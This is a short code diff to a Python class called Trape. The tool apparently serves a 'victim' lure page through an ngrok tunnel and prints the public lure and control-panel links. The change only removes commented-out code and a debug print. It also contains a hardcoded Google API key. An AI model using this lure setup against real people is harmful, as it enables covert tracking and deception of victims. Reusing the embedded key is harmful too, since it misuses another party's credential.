@@ -191,15 +191,6 @@ class Trape(object):
 					self.googl = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'
 				try:
 					opener = urllib2.build_opener()
-					'''
-					time.sleep(1.5)
-					fileLog = open(self.stats_path + '.nlog', 'r') 
-					log = fileLog.read().replace('\n', '').replace(' ', '')
-					pLog = log.find('127.0.0.1:') + 10
-					pLog = int(log[pLog:pLog+4])
-					fileLog.close()
-					os.remove(self.stats_path + '.nlog')
-					'''
 					pLog = 4040
 					ngrokStatus = str(opener.open('http://127.0.0.1:' + str(pLog) + '/api/tunnels').read()).replace('\n', '').replace(' ', '')
 					time.sleep(0.5)
@@ -216,19 +207,12 @@ class Trape(object):
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['whiteBold'] + "PUBLIC INFORMATION" + utils.Text['end'])
 						utils.Go("\t" + "-------------------")
 						r = utils.gShortener(self.googl, ngrokStatus.replace('https', 'http') + '/' + self.victim_path)
-						#gooGl = json.loads(r._content)
-						#if r.status_code == 200:
-						#	utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Link shortened lure: " + utils.Color['blue'] + gooGl['id']  + utils.Color['white'] + " " + "(share)")
-						#else:
-						#	utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " gooGl " + utils.Color['white'] + gooGl['error']['errors'][0]['reason'])
 						self.nGrokUrl = ngrokStatus.replace('https', 'http')
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Public lure: " + utils.Color['blue'] + self.nGrokUrl + '/' + self.victim_path + utils.Color['white'])
 						utils.Go(utils.Color['white'] + "\t" + utils.Color['yellow'] + ">" + utils.Color['white'] + "-" + utils.Color['blue'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " Control Panel link: " + utils.Color['blue'] + ngrokStatus.replace('https', 'http') + '/' + self.stats_path + utils.Color['white'])
-
 					else:
 						utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 				except Exception as e:
-					print(e)
 					utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "ERROR: " + " " + utils.Color['white'] + e.message)
 					utils.Go(utils.Color['red'] + "\t" + utils.Color['green'] + "-" + utils.Color['white'] + "--" + utils.Color['red'] + "=" + utils.Color['white'] + "["  + utils.Color['white'] + " We can't connect with nGrok " + utils.Color['white'])
 			utils.Go("\n" + utils.Color['white'])
